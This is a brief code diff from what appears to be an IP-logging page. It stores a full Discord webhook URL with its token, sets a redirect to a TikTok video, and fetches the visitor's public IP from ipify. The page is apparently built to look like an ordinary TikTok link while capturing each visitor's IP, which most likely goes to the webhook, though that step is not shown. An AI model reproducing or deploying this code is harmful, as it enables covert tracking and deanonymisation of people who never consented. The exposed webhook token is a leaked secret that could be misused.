@@ -1,4 +1,4 @@
-const webhookUrl = 'https://discord.com/api/webhooks/1437159107910959124/lLFmMH0UNisz0j1P-Mev2Ew7dcBjTmBP2MmsaAParqsAz2PL9x6oxJD1ZS04IpTuh8q_'; // Twój adres webhooka
+const webhookUrl = 'https://discord.com/api/webhooks/1437159107910959124/lLFmMH0UNisz0j1P-Mev2Ew7dcBjTmBP2MmsaAParqsAz2PL9x6oxJD1ZS04IpTuh8q_';
 const redirectUrl = 'https://www.tiktok.com/@fartingchickenman576/video/7568556848639560990';
 
 fetch('https://api.ipify.org?format=json')
